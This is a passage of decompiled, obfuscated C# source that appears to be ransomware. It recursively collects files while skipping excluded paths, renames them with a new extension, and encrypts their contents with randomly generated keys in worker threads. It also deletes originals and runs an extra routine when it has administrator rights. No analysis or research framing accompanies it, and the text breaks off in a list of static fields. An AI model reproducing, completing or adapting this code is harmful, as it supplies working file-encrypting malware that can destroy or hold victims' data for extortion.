using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using gEwkBBbefylNh;

namespace igelRrgoft;

internal sealed class DbQGfNcxACeJl
{
	public sealed class MMJfWgiiTMVc
	{
		private static StringCollection leYXazwecX;

		private static List<string> wWQgoRnCGkFV;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107407470));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107407465)) && !text.ToLower().Contains(getString_0(107407412)) && !text.ToLower().Contains(getString_0(107392594)) && !text.ToLower().Contains(getString_0(107392613)) && !text.ToLower().Contains(getString_0(107407431)) && !text.ToLower().Contains(getString_0(107392461)) && !text.ToLower().Contains(getString_0(107392370)) && !text.ToLower().Contains(getString_0(107391841)) && !text.ToLower().Contains(getString_0(107391856)) && !text.ToLower().Contains(getString_0(107391807)) && !text.ToLower().Contains(getString_0(107391773)) && !text.ToLower().Contains(getString_0(107391788)) && !text.ToLower().Contains(getString_0(107391739)) && !text.ToLower().Contains(getString_0(107391758)) && !text.ToLower().Contains(getString_0(107391705)) && !text.ToLower().Contains(getString_0(107391724)) && !text.ToLower().Contains(getString_0(107391679)) && !text.ToLower().Contains(getString_0(107391694)) && !text.ToLower().Contains(getString_0(107391645)) && !text.Contains(fZQJZGRivPka(getString_0(107391660))) && !text.Contains(getString_0(107391603)) && !text.Contains(getString_0(107392085)) && !text.EndsWith(getString_0(107395300)) && !text.EndsWith(getString_0(107392060)) && !text.EndsWith(getString_0(107392055)) && !text.EndsWith(getString_0(107392050)) && !text.EndsWith(getString_0(107392077)) && !text.ToLower().Contains(getString_0(107392072)) && !text.ToLower().Contains(ynsSldAgNPTL))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(hGmvNAyfRthpRJG) * 1024.0 * 1024.0 && oshynewGZYF == getString_0(107396726))
							{
								wWQgoRnCGkFV.Add(text);
							}
							else if (File.Exists(text) && oshynewGZYF == getString_0(107396731))
							{
								wWQgoRnCGkFV.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return wWQgoRnCGkFV;
		}

		static MMJfWgiiTMVc()
		{
			Strings.CreateGetStringDelegate(typeof(MMJfWgiiTMVc));
			leYXazwecX = new StringCollection();
			wWQgoRnCGkFV = new List<string>();
		}
	}

	private sealed class dcvCYFKqouCzE
	{
		public string IhwCWVllYwuB;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == IhwCWVllYwuB;
		}
	}

	private sealed class DbjCRzWTkejve
	{
		private sealed class tyZzjLVBpLRq
		{
			public DbjCRzWTkejve tcgUPSCbpeRn;

			public string zRmUjnpajzq;

			public void _003CCrypt_003Eb__22()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					wbfaudJqMkhd(WindowsIdentity.GetCurrent().Name, zRmUjnpajzq);
				}
			}

			public void _003CCrypt_003Eb__23()
			{
				OsRrFOFumkcI(zRmUjnpajzq, tcgUPSCbpeRn.XPgYnwdpdOCpUosEP, tcgUPSCbpeRn.ZDGxcpqnRrWbS, tcgUPSCbpeRn.NFHDfdGlHX, tcgUPSCbpeRn.anMiJqzbjQlJv);
			}
		}

		public string[] XPgYnwdpdOCpUosEP;

		public string[] NFHDfdGlHX;

		public string anMiJqzbjQlJv;

		public string ZDGxcpqnRrWbS;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__21(string string_0)
		{
			tyZzjLVBpLRq CS_0024_003C_003E8__locals0 = new tyZzjLVBpLRq();
			CS_0024_003C_003E8__locals0.tcgUPSCbpeRn = this;
			CS_0024_003C_003E8__locals0.zRmUjnpajzq = string_0;
			if (UKtytEenHZq && !ixxpmNQdpls().Contains(getString_0(107389797)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						wbfaudJqMkhd(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.zRmUjnpajzq);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (eiVEOVqJMVupoZG == getString_0(107396732))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					OsRrFOFumkcI(CS_0024_003C_003E8__locals0.zRmUjnpajzq, CS_0024_003C_003E8__locals0.tcgUPSCbpeRn.XPgYnwdpdOCpUosEP, CS_0024_003C_003E8__locals0.tcgUPSCbpeRn.ZDGxcpqnRrWbS, CS_0024_003C_003E8__locals0.tcgUPSCbpeRn.NFHDfdGlHX, CS_0024_003C_003E8__locals0.tcgUPSCbpeRn.anMiJqzbjQlJv);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				OsRrFOFumkcI(CS_0024_003C_003E8__locals0.zRmUjnpajzq, XPgYnwdpdOCpUosEP, ZDGxcpqnRrWbS, NFHDfdGlHX, anMiJqzbjQlJv);
			}
		}

		static DbjCRzWTkejve()
		{
			Strings.CreateGetStringDelegate(typeof(DbjCRzWTkejve));
		}
	}

	private sealed class boKBUCZYgxt
	{
		private sealed class lfaNmpoewcZ
		{
			public boKBUCZYgxt kFYUBFWTKpZp;

			public string wwTxlPlVyFPLO;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2f()
			{
				foreach (string item in zKXWFFBSYfij)
				{
					if (wwTxlPlVyFPLO.ToLower().EndsWith(item + kFYUBFWTKpZp.EpSJuHuGORNiTk) && ZfHomqQTuOmtb == getString_0(107396743))
					{
						if (Convert.ToInt32(izlGYUEMadkw) * 1024 * 1024 > new FileInfo(wwTxlPlVyFPLO).Length)
						{
							try
							{
								IoVTZTUGdmDX.irIbESpHjMem(getString_0(107392771), getString_0(107392798), getString_0(107392753), wwTxlPlVyFPLO);
							}
							catch
							{
							}
						}
					}
					else if (wwTxlPlVyFPLO.ToLower().EndsWith(item) && ZfHomqQTuOmtb == getString_0(107396748))
					{
						try
						{
							IoVTZTUGdmDX.irIbESpHjMem(getString_0(107392771), getString_0(107392798), getString_0(107392753), wwTxlPlVyFPLO);
						}
						catch
						{
						}
					}
				}
			}

			static lfaNmpoewcZ()
			{
				Strings.CreateGetStringDelegate(typeof(lfaNmpoewcZ));
			}
		}

		private sealed class hdgUsVcFgbbtV
		{
			public boKBUCZYgxt kFYUBFWTKpZp;

			public string FWzNbovbqMDiaQ;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in zKXWFFBSYfij)
				{
					if (FWzNbovbqMDiaQ.ToLower().EndsWith(item + kFYUBFWTKpZp.EpSJuHuGORNiTk) && ZfHomqQTuOmtb == getString_0(107396746))
					{
						if (Convert.ToInt32(izlGYUEMadkw) * 1024 * 1024 > new FileInfo(FWzNbovbqMDiaQ).Length)
						{
							try
							{
								IoVTZTUGdmDX.irIbESpHjMem(getString_0(107392774), getString_0(107392801), getString_0(107392756), FWzNbovbqMDiaQ);
							}
							catch
							{
							}
						}
					}
					else if (FWzNbovbqMDiaQ.ToLower().EndsWith(item) && ZfHomqQTuOmtb == getString_0(107396751))
					{
						try
						{
							IoVTZTUGdmDX.irIbESpHjMem(getString_0(107392774), getString_0(107392801), getString_0(107392756), FWzNbovbqMDiaQ);
						}
						catch
						{
						}
					}
				}
			}

			static hdgUsVcFgbbtV()
			{
				Strings.CreateGetStringDelegate(typeof(hdgUsVcFgbbtV));
			}
		}

		public List<string> rfPgJBYhJKPesy;

		public List<string> tuTyXmrKqj;

		public string EpSJuHuGORNiTk;

		public string[] sGmUAcByMV;

		public string IauEKWzaXvhA;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2e(string string_0)
		{
			lfaNmpoewcZ CS_0024_003C_003E8__locals0;
			foreach (string item in tuTyXmrKqj)
			{
				if (sGmUAcByMV.Length != 0)
				{
					string[] array = sGmUAcByMV;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_072e;
					}
				}
				try
				{
					if (item.EndsWith(EpSJuHuGORNiTk))
					{
						goto IL_072e;
					}
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				if (!item.EndsWith(string_0) || JySLVGbqxfI.Contains(item))
				{
					continue;
				}
				if (GiTWgfuVPecn == getString_0(107396740))
				{
					try
					{
						if (ksNSGmJtVt.QXPwKbEUYXq(item))
						{
							ksNSGmJtVt.rSVoPwZkHVNrP(item);
						}
					}
					catch
					{
					}
				}
				JySLVGbqxfI.Add(item);
				if (!kFvYdcQcXMKvbXYVW.Contains(Path.GetDirectoryName(item)))
				{
					kFvYdcQcXMKvbXYVW.Add(Path.GetDirectoryName(item));
				}
				DpuvngxWFUdSQzJ(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (wnBkEuneoGOR)
						{
							try
							{
								File.AppendAllText(EMMziOGItwvgBn, getString_0(107390483) + item + getString_0(107407396) + ex2.Message + getString_0(107396630));
							}
							catch (Exception)
							{
							}
						}
						OGYcpcFLVvGwO++;
						goto end_IL_00ee;
					}
					if (NXdoiZyiNrteeIx == getString_0(107396740) && new FileInfo(item).Length > Convert.ToInt32(dgOdFMVpedl) * 1024 * 1024 && !rfPgJBYhJKPesy.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new lfaNmpoewcZ();
						CS_0024_003C_003E8__locals0.kFYUBFWTKpZp = this;
						try
						{
							if (EpSJuHuGORNiTk != getString_0(107389724))
							{
								if (PqrzhfLlmsnd)
								{
									EpSJuHuGORNiTk = mpATdrWCpkge + EpSJuHuGORNiTk;
								}
								File.Move(item, item + EpSJuHuGORNiTk);
							}
						}
						catch (Exception ex4)
						{
							if (wnBkEuneoGOR)
							{
								try
								{
									File.AppendAllText(EMMziOGItwvgBn, getString_0(107390483) + item + getString_0(107407335) + ex4.Message + getString_0(107396630));
								}
								catch (Exception)
								{
								}
							}
							OGYcpcFLVvGwO++;
							goto end_IL_00ee;
						}
						CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO = getString_0(107392687);
						if (EpSJuHuGORNiTk != getString_0(107389724))
						{
							CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO = item + EpSJuHuGORNiTk;
						}
						else
						{
							CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO = item;
						}
						if (RcvnDaFPNx == getString_0(107396740))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in zKXWFFBSYfij)
								{
									if (CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.kFYUBFWTKpZp.EpSJuHuGORNiTk) && ZfHomqQTuOmtb == lfaNmpoewcZ.getString_0(107396743))
									{
										if (Convert.ToInt32(izlGYUEMadkw) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO).Length)
										{
											try
											{
												IoVTZTUGdmDX.irIbESpHjMem(lfaNmpoewcZ.getString_0(107392771), lfaNmpoewcZ.getString_0(107392798), lfaNmpoewcZ.getString_0(107392753), CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO.ToLower().EndsWith(item2) && ZfHomqQTuOmtb == lfaNmpoewcZ.getString_0(107396748))
									{
										try
										{
											IoVTZTUGdmDX.irIbESpHjMem(lfaNmpoewcZ.getString_0(107392771), lfaNmpoewcZ.getString_0(107392798), lfaNmpoewcZ.getString_0(107392753), CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = mZuoQvaDwmCupGaw.CdMZevdMaNJ(32);
						string s = cNhkWTsTMsDed.VZcAhXOlbGZB(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = LZNaqbrBBsk.VKNOYHjfGxPJrj(CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO, Convert.ToInt32(dgOdFMVpedl) * 1024 * 1024);
						LZNaqbrBBsk.zRtbURaWGBf(SnDciYNnSqT: (!gzeLuZIeGEn) ? (pWVZjGlhSAv ? LZNaqbrBBsk.xvROdGWCNShy(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : LZNaqbrBBsk.xvROdGWCNShy(byte_, Encoding.ASCII.GetBytes(IauEKWzaXvhA), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (pWVZjGlhSAv ? yUqvKqSgNNEdVE.rJtchqEipJTNQ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : yUqvKqSgNNEdVE.rJtchqEipJTNQ(byte_, Encoding.ASCII.GetBytes(IauEKWzaXvhA), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), NGxKitMeGqa: CS_0024_003C_003E8__locals0.wwTxlPlVyFPLO, ESpdswCNdRrO: bytes);
					}
					else
					{
						if (PqrzhfLlmsnd)
						{
							EpSJuHuGORNiTk = mpATdrWCpkge + EpSJuHuGORNiTk;
						}
						string text2 = mZuoQvaDwmCupGaw.CdMZevdMaNJ(32);
						string s2 = cNhkWTsTMsDed.VZcAhXOlbGZB(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (EpSJuHuGORNiTk != getString_0(107389724))
						{
							if (!rTfnyAYcMHFOLjucY)
							{
								if (!pWVZjGlhSAv)
								{
									YYKAFRykvgtiXUP(item, item + EpSJuHuGORNiTk, dwEsbNrZYYpdu);
								}
								else
								{
									YYKAFRykvgtiXUP(item, item + EpSJuHuGORNiTk, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!pWVZjGlhSAv)
									{
										eYTqDsWWuaKp(item, item + EpSJuHuGORNiTk, dwEsbNrZYYpdu);
									}
									else
									{
										eYTqDsWWuaKp(item, item + EpSJuHuGORNiTk, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (wnBkEuneoGOR)
									{
										try
										{
											File.AppendAllText(EMMziOGItwvgBn, getString_0(107390483) + item + getString_0(107389678) + ex6.Message + getString_0(107396630));
										}
										catch (Exception)
										{
										}
									}
									OGYcpcFLVvGwO++;
									goto end_IL_00ee;
								}
							}
						}
						else if (!rTfnyAYcMHFOLjucY)
						{
							if (!pWVZjGlhSAv)
							{
								YYKAFRykvgtiXUP(item, item + getString_0(107389719), dwEsbNrZYYpdu);
							}
							else
							{
								YYKAFRykvgtiXUP(item, item + getString_0(107389719), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!pWVZjGlhSAv)
								{
									eYTqDsWWuaKp(item, item, dwEsbNrZYYpdu);
								}
								else
								{
									eYTqDsWWuaKp(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (wnBkEuneoGOR)
								{
									try
									{
										File.AppendAllText(EMMziOGItwvgBn, getString_0(107390483) + item + getString_0(107389678) + ex8.Message + getString_0(107396630));
									}
									catch (Exception)
									{
									}
								}
								OGYcpcFLVvGwO++;
								goto end_IL_00ee;
							}
						}
						if (pWVZjGlhSAv)
						{
							if (EpSJuHuGORNiTk != getString_0(107389724))
							{
								ETdgovIugJJSH(item + EpSJuHuGORNiTk, bytes2);
							}
							else
							{
								ETdgovIugJJSH(item, bytes2);
							}
						}
					}
					goto IL_072e;
					end_IL_00ee:;
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				continue;
				IL_072e:
				tuTyXmrKqj.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__30(string string_0)
		{
			hdgUsVcFgbbtV CS_0024_003C_003E8__locals0 = new hdgUsVcFgbbtV();
			CS_0024_003C_003E8__locals0.kFYUBFWTKpZp = this;
			CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ = string_0;
			if (sGmUAcByMV.Length != 0)
			{
				string[] array = sGmUAcByMV;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ.EndsWith(EpSJuHuGORNiTk))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!JySLVGbqxfI.Contains(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ))
			{
				if (GiTWgfuVPecn == getString_0(107396740))
				{
					try
					{
						if (ksNSGmJtVt.QXPwKbEUYXq(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ))
						{
							ksNSGmJtVt.rSVoPwZkHVNrP(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ);
						}
					}
					catch
					{
					}
				}
				JySLVGbqxfI.Add(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ);
				if (!kFvYdcQcXMKvbXYVW.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ)))
				{
					kFvYdcQcXMKvbXYVW.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ));
				}
				DpuvngxWFUdSQzJ(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (wnBkEuneoGOR)
						{
							try
							{
								File.AppendAllText(EMMziOGItwvgBn, getString_0(107390483) + CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + getString_0(107407396) + ex2.Message + getString_0(107396630));
							}
							catch (Exception)
							{
							}
						}
						OGYcpcFLVvGwO++;
						goto end_IL_0117_2;
					}
					if (NXdoiZyiNrteeIx == getString_0(107396740) && new FileInfo(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ).Length > Convert.ToInt32(dgOdFMVpedl) * 1024 * 1024)
					{
						try
						{
							if (EpSJuHuGORNiTk != getString_0(107389724))
							{
								if (PqrzhfLlmsnd)
								{
									EpSJuHuGORNiTk = mpATdrWCpkge + EpSJuHuGORNiTk;
								}
								File.Move(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + EpSJuHuGORNiTk);
							}
						}
						catch (Exception ex4)
						{
							if (wnBkEuneoGOR)
							{
								try
								{
									File.AppendAllText(EMMziOGItwvgBn, getString_0(107390483) + CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + getString_0(107407335) + ex4.Message + getString_0(107396630));
								}
								catch (Exception)
								{
								}
							}
							OGYcpcFLVvGwO++;
							return;
						}
						if (EpSJuHuGORNiTk != getString_0(107389724))
						{
							CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ += EpSJuHuGORNiTk;
						}
						if (RcvnDaFPNx == getString_0(107396740))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in zKXWFFBSYfij)
								{
									if (CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.kFYUBFWTKpZp.EpSJuHuGORNiTk) && ZfHomqQTuOmtb == hdgUsVcFgbbtV.getString_0(107396746))
									{
										if (Convert.ToInt32(izlGYUEMadkw) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ).Length)
										{
											try
											{
												IoVTZTUGdmDX.irIbESpHjMem(hdgUsVcFgbbtV.getString_0(107392774), hdgUsVcFgbbtV.getString_0(107392801), hdgUsVcFgbbtV.getString_0(107392756), CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ.ToLower().EndsWith(item) && ZfHomqQTuOmtb == hdgUsVcFgbbtV.getString_0(107396751))
									{
										try
										{
											IoVTZTUGdmDX.irIbESpHjMem(hdgUsVcFgbbtV.getString_0(107392774), hdgUsVcFgbbtV.getString_0(107392801), hdgUsVcFgbbtV.getString_0(107392756), CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = mZuoQvaDwmCupGaw.CdMZevdMaNJ(32);
						string s = cNhkWTsTMsDed.VZcAhXOlbGZB(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = LZNaqbrBBsk.VKNOYHjfGxPJrj(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, Convert.ToInt32(dgOdFMVpedl) * 1024 * 1024);
						LZNaqbrBBsk.zRtbURaWGBf(SnDciYNnSqT: (!gzeLuZIeGEn) ? (pWVZjGlhSAv ? LZNaqbrBBsk.xvROdGWCNShy(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : LZNaqbrBBsk.xvROdGWCNShy(byte_, Encoding.ASCII.GetBytes(IauEKWzaXvhA), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (pWVZjGlhSAv ? yUqvKqSgNNEdVE.rJtchqEipJTNQ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : yUqvKqSgNNEdVE.rJtchqEipJTNQ(byte_, Encoding.ASCII.GetBytes(IauEKWzaXvhA), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), NGxKitMeGqa: CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, ESpdswCNdRrO: bytes);
					}
					else
					{
						if (PqrzhfLlmsnd)
						{
							EpSJuHuGORNiTk = mpATdrWCpkge + EpSJuHuGORNiTk;
						}
						string text2 = mZuoQvaDwmCupGaw.CdMZevdMaNJ(32);
						string s2 = cNhkWTsTMsDed.VZcAhXOlbGZB(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (EpSJuHuGORNiTk != getString_0(107389724))
						{
							if (!rTfnyAYcMHFOLjucY)
							{
								if (!pWVZjGlhSAv)
								{
									YYKAFRykvgtiXUP(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + EpSJuHuGORNiTk, dwEsbNrZYYpdu);
								}
								else
								{
									YYKAFRykvgtiXUP(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + EpSJuHuGORNiTk, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!pWVZjGlhSAv)
									{
										eYTqDsWWuaKp(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + EpSJuHuGORNiTk, dwEsbNrZYYpdu);
									}
									else
									{
										eYTqDsWWuaKp(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + EpSJuHuGORNiTk, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (wnBkEuneoGOR)
									{
										try
										{
											File.AppendAllText(EMMziOGItwvgBn, getString_0(107390483) + CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + getString_0(107389678) + ex6.Message + getString_0(107396630));
										}
										catch (Exception)
										{
										}
									}
									OGYcpcFLVvGwO++;
									return;
								}
							}
						}
						else if (!rTfnyAYcMHFOLjucY)
						{
							if (!pWVZjGlhSAv)
							{
								YYKAFRykvgtiXUP(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + getString_0(107389719), dwEsbNrZYYpdu);
							}
							else
							{
								YYKAFRykvgtiXUP(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + getString_0(107389719), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!pWVZjGlhSAv)
								{
									eYTqDsWWuaKp(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, dwEsbNrZYYpdu);
								}
								else
								{
									eYTqDsWWuaKp(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (wnBkEuneoGOR)
								{
									try
									{
										File.AppendAllText(EMMziOGItwvgBn, getString_0(107390483) + CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + getString_0(107389678) + ex8.Message + getString_0(107396630));
									}
									catch (Exception)
									{
									}
								}
								OGYcpcFLVvGwO++;
								return;
							}
						}
						if (pWVZjGlhSAv)
						{
							if (EpSJuHuGORNiTk != getString_0(107389724))
							{
								ETdgovIugJJSH(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ + EpSJuHuGORNiTk, bytes2);
							}
							else
							{
								ETdgovIugJJSH(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			tuTyXmrKqj.Remove(CS_0024_003C_003E8__locals0.FWzNbovbqMDiaQ);
		}

		static boKBUCZYgxt()
		{
			Strings.CreateGetStringDelegate(typeof(boKBUCZYgxt));
		}
	}

	private sealed class zPNnppVvrcCo
	{
		public string jMldWcjxxgdUAQF;

		public string yNtVSlTrDKyBbjG;

		public void _003CEncrypt2_003Eb__3e()
		{
			while (true)
			{
				try
				{
					File.Delete(jMldWcjxxgdUAQF);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3f()
		{
			while (true)
			{
				try
				{
					if (File.Exists(yNtVSlTrDKyBbjG))
					{
						File.Delete(yNtVSlTrDKyBbjG);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string jYtPzkyZAIWyuO;

	public static byte[] dwEsbNrZYYpdu;

	public static string oshynewGZYF;

	public static string hGmvNAyfRthpRJG;

	public static List<string> NxzbNepQXM;

	public static List<string> OMaRZIEafHZ;

	public static string fMeVGYfZEqWIT;

	public static string IauEKWzaXvhA;

	public static string LSRZdRUSOM;

	public static string IjDiPwITXKF;

	public static int UfSUSXJgOcwOs;

	public static string GiTWgfuVPecn;

	public static string kYYskRZASkhQ;

	public static string MpmgvBYaLaSbnY;

	public static string IeKwaPTezjkQDpKG;

	public static string aaxrqVtlTTwaSk;

	public static string ariILlBHJzcJ;

	public static string uYovVkzDWye;

	public static string xCBKmZUalU;

	public static List<string> bvUZAsIAmqXqC;

	public static List<string> kFvYdcQcXMKvbXYVW;

	public static string mPBfGootLuLXJ;

	public static string kEHvKLBwHtuY;

	public static string xPeNeVbvRCC;

	public static List<string> JySLVGbqxfI;

	public static string kORPBzBdjy;

	private static string PMRQITQObEzp;

	public static string eiVEOVqJMVupoZG;

	public static string HyUvROtcheQhYTrM;

	public static List<string> JFmJYDYJbJqWkNVD;

	public static List<string> RYQEJChRDfRniT;

	public static List<string> IYyHyFnceXw;

	public static List<string> mHHmssBZBWOZ;

	public static string rtAqVHFswBwj;

	public static List<string> BmlqsqzWSp;

	public static List<string> phIVwPSoCuYf;

	public static string IvhuCXWwZumGPb;

	public static string hmHVGpHMkL;

	internal static DateTime SuSdzNJyyA;

	internal static DateTime tBAHkTTjaqbd;

	public static string NXdoiZyiNrteeIx;

	public static string dgOdFMVpedl;

	public static string ciHqTVbhEVV;

	public static string yZYikXqGFNz;

	public static string SDAcXCHWUvTN;

	public static string GpNvmEbLoW;

	public static string NdkBdhvmkUBFR;

	public static string RcvnDaFPNx;

	public static List<string> zKXWFFBSYfij;

	public static string ZfHomqQTuOmtb;

	public static string izlGYUEMadkw;

	public static string IHVTjtEZmOq;

	public static string mZaewZqNNWRle;

	public static string KzDKAwpEDBDhbZ;

	public static string MsZHKpPUIB;

	public static string UyIztOAKEezWP;

	public static string PHCDdlXNXITu;

	public static string XnbJtBigjAr;

	public static string cIwOYeNPGIS;

